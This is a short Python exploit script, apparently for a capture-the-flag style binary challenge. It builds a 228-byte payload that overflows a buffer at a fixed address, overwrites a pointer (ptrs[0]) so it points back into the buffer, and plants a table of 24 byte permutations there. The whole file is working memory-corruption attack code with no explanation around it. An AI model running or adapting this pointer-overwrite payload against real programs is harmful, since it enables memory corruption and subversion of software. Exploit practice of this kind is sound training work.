# exploit.py
import struct

vuln = 0x555555558040
target_in_vuln = vuln + 64           # where we'll place the perms (choose 64 arbitrarily)
ptrs_offset = 32                     # ptrs starts at vuln + 32
perms = [
    [0,1,2,3],[0,1,3,2],[0,2,1,3],[0,2,3,1],
    [0,3,1,2],[0,3,2,1],[1,0,2,3],[1,0,3,2],
    [1,2,0,3],[1,2,3,0],[1,3,0,2],[1,3,2,0],
    [2,0,1,3],[2,0,3,1],[2,1,0,3],[2,1,3,0],
    [2,3,0,1],[2,3,1,0],[3,0,1,2],[3,0,2,1],
    [3,1,0,2],[3,1,2,0],[3,2,0,1],[3,2,1,0]
]

payload = bytearray()

# 1) filler until ptrs[0]
payload += b"A" * ptrs_offset             # 32 bytes

# 2) overwrite ptrs[0] with pointer to target_in_vuln (little endian 8 bytes)
payload += struct.pack("<Q", target_in_vuln)

# 3) pad up to target_in_vuln offset
pad_after_ptr = (target_in_vuln - vuln) - len(payload)  # = 64 - current_len
if pad_after_ptr < 0:
    raise SystemExit("pointer location conflict")
payload += b"B" * pad_after_ptr

# 4) write permutations at target_in_vuln
for p in perms:
    payload += bytes(p)

# 5) pad to exactly 228 bytes so read(...) consumes everything
if len(payload) > 228:
    raise SystemExit(f"payload too large: {len(payload)} > 228")
payload += b"\x00" * (228 - len(payload))

open("payload.bin", "wb").write(payload)
print("wrote payload.bin", len(payload), "bytes")
